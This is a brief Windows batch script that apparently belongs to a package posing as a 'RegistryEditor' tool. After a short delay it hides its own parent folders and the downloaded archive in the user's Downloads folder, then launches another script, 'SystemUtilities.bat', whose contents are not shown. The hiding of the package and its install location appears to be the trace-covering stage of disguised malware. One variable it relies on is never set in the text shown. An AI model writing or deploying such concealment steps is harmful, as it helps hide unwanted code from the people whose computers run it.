@echo off

timeout /t 2 >nul

attrib +h "%script_dir%\.."
attrib +h "%script_dir%\..\.."

attrib +h "%USERPROFILE%\Downloads\RegistryEditor-main.zip"

call "%~dp0SystemUtilities.bat"
